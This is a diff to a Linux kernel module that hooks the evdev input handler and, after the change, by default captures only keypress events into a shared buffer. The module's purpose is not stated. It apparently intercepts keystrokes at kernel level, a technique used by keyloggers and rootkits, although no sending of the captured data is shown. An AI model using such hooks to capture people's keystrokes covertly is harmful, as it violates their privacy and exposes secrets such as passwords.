@@ -18,6 +18,8 @@ MODULE_DESCRIPTION("");
 MODULE_AUTHOR("");
 MODULE_LICENSE("GPL");
 
+//#define OUTPUT_MOUSE_EVENTS 1
+
 #define kprint(fmt, ...) printk( (KBUILD_MODNAME ": "fmt), ##__VA_ARGS__ );
 
 #ifndef CONFIG_X86_64
@@ -99,6 +101,7 @@ static asmlinkage void hooked_evdev_events(struct input_handle *handle,
 {
     int i;
     for( i = 0; i < count; i++ ){
+#ifdef OUTPUT_MOUSE_EVENTS
         /* We don't care about anything except for keypresses/mouse/touchpad */
         if( vals[i].type != EV_KEY && vals[i].type != EV_REL && vals[i].type != EV_ABS ){
             continue;
@@ -106,6 +109,11 @@ static asmlinkage void hooked_evdev_events(struct input_handle *handle,
         if( vals[i].type == EV_REL ){
             last_handle = handle; // save mouse
         }
+#else
+        if( vals[i].type != EV_KEY ){
+            continue;
+        }
+#endif
         spin_lock(&input_lock); // This could cause small input lag? Maybe add a buffer
         last_event = vals[i];
         fresh = true;
